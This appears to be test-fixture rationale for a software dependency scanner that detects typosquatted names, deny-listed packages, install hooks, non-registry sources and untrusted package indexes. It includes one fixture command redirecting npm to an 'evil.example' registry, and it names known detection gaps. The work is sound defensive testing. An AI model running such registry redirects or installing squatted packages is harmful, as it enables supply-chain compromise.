rationale: reqeusts->requests is an adjacent transposition: Damerau-Levenshtein distance 1, name length 8>=SHORT_NAME_LEN(5), so nearestPopular() heuristic (3) flags it high -> enforce deny.
loadsh->lodash is an adjacent transposition (d-h swap region): Damerau distance 1, length 6>=5, lodash is in DEFAULT_POPULAR_NPM -> typosquat high -> deny.
python-requests deseparates to 'pythonrequests' = affix 'python' + base 'requests' (>=4 chars); affix-wrap heuristic (2b) returns distance 2 -> typosquat high -> deny.
nodefetch deseparates equal to node-fetch (a DEFAULT_POPULAR_NPM member) while the raw forms differ -> separator-swap heuristic (2a) distance 1 -> typosquat high -> deny.
nunpy->numpy is a single substitution (u->m) ... length 5>=5; Damerau distance 1 vs numpy in DEFAULT_POPULAR_PYPI -> typosquat high -> deny.
expres->express is a single deletion: Damerau distance 1, length 6>=5, express in DEFAULT_POPULAR_NPM -> typosquat high -> deny.
djnago->django is an adjacent transposition (na<->an): Damerau distance 1, length 6>=5, django in DEFAULT_POPULAR_PYPI -> typosquat high -> deny.
lodash-js deseparates to 'lodashjs' = base 'lodash' (>=4) + affix 'js'; affix-wrap (2b) distance 2 -> typosquat high -> deny.
cryptohraphy->cryptography is a single transposition (gr/hr region adjacent swap of g<->h): Damerau distance 1, length 12>=5, cryptography in DEFAULT_POPULAR_PYPI -> typosquat high -> deny.
type-script deseparates to 'typescript' = exactly a DEFAULT_POPULAR_NPM member with a separator inserted -> separator-swap (2a) distance 1 -> typosquat high -> deny.
evil-pkg is on the operator deny list; canon() compares PEP503 names and short-circuits to a denied-package high finding -> deny.
evil_pkg normalizes via pep503Name to 'evil-pkg', matching the deny entry 'evil-pkg' (underscore<->hyphen collapse) -> denied-package high -> deny. Tests PEP503 deny normalization (P4).
flatmap-stream (the historical event-stream compromise vector) is deny-listed; canon() exact match -> denied-package high -> deny.
Evil.PKG -> pep503Name 'evil-pkg' (lowercased, '.' collapsed to '-') matches deny 'evil-pkg' -> denied-package high -> deny. Confirms case+separator-insensitive deny.
PEP621 dependencies array includes the deny-listed 'evil-pkg' alongside a benign pinned dep; parsePyprojectToml extracts both, canon() matches evil-pkg -> denied-package high -> deny.
evil--pkg (double hyphen) -> pep503Name collapses runs of -_. to a single '-' giving 'evil-pkg' = deny entry -> denied-package high -> deny. Confirms run-collapse normalization (P4).
Deny applies across devDependencies too (parsePackageJson scans dependencies/devDependencies/optional/peer); flatmap-stream deny-matched -> denied-package high -> deny.
Spec contains 'git+https://' -> nonRegistrySource returns 'git'; non-registry-source high finding bypasses index review -> deny.
Editable VCS install: parseRequirementsTxt em-branch keeps the git+ target (not dropped as a flag); nonRegistrySource -> 'git' -> non-registry-source high -> deny. Tests P3 (in-file -e).
npm range 'git+ssh://...' matches \bgit\+(?:https?|ssh|file): -> nonRegistrySource 'git' -> non-registry-source high -> deny.
npm range 'file:...' matches the file: branch of nonRegistrySource -> non-registry-source high -> deny (a local path bypasses the registry entirely).
npm 'github:owner/repo' shorthand matches (?:github|gitlab|bitbucket): -> nonRegistrySource 'vcs-shorthand' high -> deny.
Editable local path: em-branch prefixes a bare './local/...' with 'file:' so nonRegistrySource recognizes file: -> non-registry-source high -> deny.
Direct reference to a bare https:// wheel URL matches the https?:// branch -> nonRegistrySource 'url' high -> deny.
Poetry inline-table git source: parsePoetryDependencyTable emits 'mylib @ git+https://evil.example/mylib.git' -> nonRegistrySource 'git' high -> deny.
parsePackageJson emits a synthetic 'script:postinstall' spec; scanOneSpec maps source.startsWith('script:') to install-script high -> deny (code runs at npm install time).
preinstall is in the parsePackageJson lifecycle-hook set -> install-script high -> deny.
'prepare' runs on npm install and git-dep installs; it is in the lifecycle set (P2 fix) -> install-script high -> deny.
Lifecycle-hook match is case-insensitive (Object.keys find toLowerCase==='prepublishonly') so the documented 'prepublishOnly' casing is caught -> install-script high -> deny.
'install' lifecycle hook present -> install-script high -> deny. (The gate flags install-time code execution regardless of whether the body looks like a legit build.)
scanIndexUrls matches --index-url <url>; the URL is not pypi.org/pythonhosted/npmjs (and no allowedIndexes configured) -> untrusted-index high -> deny (dependency confusion).
--extra-index-url matched by the same INDEX_URL_PATTERNS group; internal IP host is not canonical -> untrusted-index high -> deny.
Env-var index redirect: PIP_INDEX_URL=<url> matched by the env-var INDEX_URL_PATTERNS regex (P5 fix) -> untrusted-index high -> deny.
npm --registry <url> matched by the --registry INDEX_URL_PATTERNS group; not registry.npmjs.org -> untrusted-index high -> deny.

fixture.invoke: npm config set registry https://evil.example/npm && npm install

rationale: 'config set registry <url>' matched by the config-set-registry INDEX_URL_PATTERNS group -> untrusted-index high -> deny.
UV_INDEX_URL env-var assignment matched by the env-var index regex -> untrusted-index high -> deny.
npmAliasTarget('npm:loadsh@1.0.0')='loadsh'; the spec.name becomes the TARGET 'loadsh' (P1 fix), which is Damerau-1 from lodash -> typosquat high on the real fetched package -> deny.
Alias 'harmless' resolves to target 'evil-pkg'; deny-list canon() matches the TARGET, not the innocuous alias key -> denied-package high -> deny.

Scoped alias target: npmAliasTarget('npm:@scope/evil-pkg@1.0.0')='@scope/evil-pkg'; pep503 collapse keeps 'evil' segments — author deny entry '@scope/evil-pkg' matched -> denied-package high -> deny. Confirms scoped-alias resolution.
With requirePinned policy, '>=1.0' is not pinned (isPinned needs ==exact and no <>~^!=) -> unpinned medium -> enforce review. (Not a popular/typosquat name; no other finding.)
npm caret range '^1.2.0' fails the exact 'X.Y.Z' isPinned test -> unpinned medium -> review. A later release could land malicious silently.
Bare name with no version specifier is unpinned (no '==') -> unpinned medium -> review under requirePinned.
'<2.0' is an upper-bound range, not an exact pin (isPinned requires == and rejects <>~^!=) -> unpinned medium -> review under requirePinned.
npm dist-tag 'latest' is not an exact X.Y.Z version -> isPinned false -> unpinned medium -> review. A floating tag lets a later malicious publish land silently.

reqvests vs requests is a single substitution (u->v): Damerau distance 1, length 8>=SHORT_NAME_LEN(5) -> typosquat high -> deny. (Re-registered: confirmed the 1-edit squat IS caught; the 2-edit reqxuestz residual stays a gap, sc-cal-07/08.)

A SINGLE Cyrillic homoglyph U+0435 'е' for ASCII 'e' is Damerau distance 1 from 'requests' (length 8>=5) -> typosquat high -> deny. (Re-registered as a real catch; TWO homoglyphs = distance 2 stays a gap, sc-cal-03.)

Re-registered from a previously-mislabeled FP. A NON-CANONICAL --index-url: scanIndexUrls matches --index-url <url>, host is not pypi.org/pythonhosted/npmjs (isCanonicalIndex false, no allowedIndexes) -> untrusted-index high -> deny. (The tokenizer also misparses the URL as a positional package -> incidental non-registry-source:high; both high so deny holds; untrusted-index is the meaningful catch.)
